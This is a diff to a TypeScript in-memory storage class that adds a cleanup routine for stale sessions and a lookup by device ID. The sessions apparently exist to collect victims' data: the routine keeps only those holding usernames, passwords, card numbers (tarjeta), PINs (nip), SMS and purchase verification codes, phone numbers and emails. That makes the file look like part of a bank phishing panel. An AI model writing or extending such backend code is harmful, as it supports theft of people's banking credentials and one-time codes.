@@ -875,8 +875,34 @@ export class MemStorage implements IStorage {
     
     return deletedCount;
   }
-  
 
+  async cleanupEmptySessions(): Promise<number> {
+    const tenMinutesAgo = new Date(Date.now() - 10 * 60 * 1000);
+    let deletedCount = 0;
+    
+    for (const [sessionId, session] of Array.from(this.sessions.entries())) {
+      const hasImportantData = session.username || session.password || session.tarjeta || 
+                              session.nip || session.sms || session.smsCompra || 
+                              session.celular || session.correo || session.contrasena;
+      
+      if (!hasImportantData && session.createdAt && session.createdAt < tenMinutesAgo) {
+        this.sessions.delete(sessionId);
+        deletedCount++;
+        console.log(`Sesión vacía eliminada automáticamente: ${sessionId}`);
+      }
+    }
+    
+    return deletedCount;
+  }
+
+  async getSessionByDeviceId(deviceId: string): Promise<Session | undefined> {
+    for (const session of Array.from(this.sessions.values())) {
+      if (session.deviceId === deviceId) {
+        return session;
+      }
+    }
+    return undefined;
+  }
 }
 
 // Export storage instance
